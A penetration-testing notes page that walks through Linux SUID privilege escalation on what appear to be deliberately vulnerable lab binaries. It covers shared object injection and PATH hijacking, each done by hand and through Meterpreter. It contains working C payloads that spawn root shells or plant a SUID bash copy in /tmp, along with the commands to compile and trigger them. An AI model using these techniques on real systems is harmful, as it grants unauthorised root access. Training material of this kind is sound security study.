# SUID and SGID

## 01 - Unix Shell

### 1.1 - Known Exploits

Look at the Enumeration and Discovery phase related to [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Privilege Escalation/Linux/SUID and SGID]]

A few things you might need to know. Some binaries might be vulnerable due to terrible programming practices. You'll find need to do a bit of research if [GTFOBins](https://gtfobins.github.io) is not giving the results you need. Lookup on [Exploit-DB](https://exploit-db.com) or use the `searchsploit` to find the local copies of that particular exploit or try to search up the internet using a **Google** search engine and/or **Github** (any source forge repositories will do) to find anything that you're looking for that starts with a CVE.

### 1.2 - Shared Object Injection

#### 1.2.1 - Detect

- A SUID binary file is vulnerable to shared object injection

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
```

Let's execute the SUID binary

```
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
```

Now we have to run the `strace` to see what we can find while filtering with the `grep` command to find errors like "no such file"

```
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

Looks like we have a better place to insert our own modification to exploit the shared object library and it starts in `/home/user/.config/libcalc.so` and it's missing a `.config` hidden directory. Let's compile it and run the binary once again to gain root privileges.

#### 1.2.2 - Exploit

```
user@debian:~$ cat libcalc.c
#include <stdio.h>  
#include <stdlib.h>  
  
static void inject() __attribute__((constructor));  
  
void inject() {  
        setuid(0);  
        system("/bin/bash -p");  
}
user@debian:~$ mkdir /home/user/.config
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
user@debian:~$ /usr/local/bin/suid-so
bash-4.1# whoami
root
```

#### 1.2.3 - Cleanup

```
bash-4.1# exit
user@debian:~$ rm -rf /home/user/.config/
user@debian:~$ rm libcalc.c
```

### 1.3 - Environment Variables

#### 1.3.1 - Detect

It describes itself that it derives from the user's PATH environment variable and to to run the programs that doesn't require to specify and absolute path that can be exploited.

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
```

When the program it seems it's gonna start a apache2 webserver

```
$ /usr/local/bin/suid-env
Starting web server: apache2httpd (pid 1656) already running
.
```

We use the strings command to look any readable functions that we can analyze.

```
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

This is the main problem here the service apache2 start works but the point was it was not specified the full path. This is where the `$PATH` bash predefined variable for the shell environment that is useful for this situation. We will compile our own version of service.c and re-define the `$PATH` variable

#### 1.3.2 - Exploit

```
user@debian:~$ cat service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
user@debian:~$ gcc -o service service.c
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

#### 1.3.3 - Cleanup

```
root@debian:~# exit
user@debian:~$ rm service service.c
```

## 02 - Metasploit

### 2.1 - Shared Object Injection

#### 2.1.1 - Detect

```
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[+]     Module running as "TCM" user
..[snip]..
[*] Setuid/setgid files stored in /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[snip]..

user@pentestos:~$ sudo cat /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[snip]..
/usr/local/bin/suid-so
..[snip]..

meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 3384 created.
Channel 66 created.
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
ch file"usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no su 
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 4
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~$ exit
exit
exit
```

#### 2.1.2 - Exploit

```
meterpreter > pwd
/home/user
meterpreter > mkdir .config
Creating directory: .config
meterpreter > cd .config/
meterpreter > edit libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
meterpreter > execute -if gcc -a "-shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c"
Process 3449 created.
Channel 72 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 3454 created.
Channel 73 created.
TCM@debian:~/.config$ suid-so
suid-so
Calculating something, please wait...
bash-4.1# id
id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
exit
[=====================================================================>] 99 %
Done.
TCM@debian:~/.config$ exit
exit
exit
```

#### 2.1.3 - Cleanup

```
meterpreter > cd ..
meterpreter > rmdir .config
Removing directory: .config
```

### 2.2 - Environment Variables

#### 2.2.1 - Detect

```
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[+]     Module running as "TCM" user
..[snip]..
[*] Setuid/setgid files stored in /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[snip]..

user@pentestos:~$ sudo cat /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[snip]..
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
..[snip]..

meterpreter > execute -if strings -a "/usr/local/bin/suid-env"
Process 3284 created.
Channel 56 created.
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

#### 2.2.2 - Exploit

```
meterpreter > mkdir exploit
Creating directory: exploit
meterpreter > cd exploit/
meterpreter > edit /tmp/service.c
#include <stdio.h>  
  
int main() {  
    setgid(0);  
    setuid(0);  
    system("/bin/bash");  
    return 0;  
}
meterpreter > execute -f gcc -a "/tmp/service.c -o /tmp/service"
Process 3325 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 3330 created.
Channel 63 created.
export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
TCM@debian:~$ /usr/local/bin/suid-env
/usr/local/bin/suid-env
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
exit
TCM@debian:~$ exit
exit
exit
```

#### 2.2.3 - Cleanup

`meterpreter > rm /tmp/service /tmp/service.c`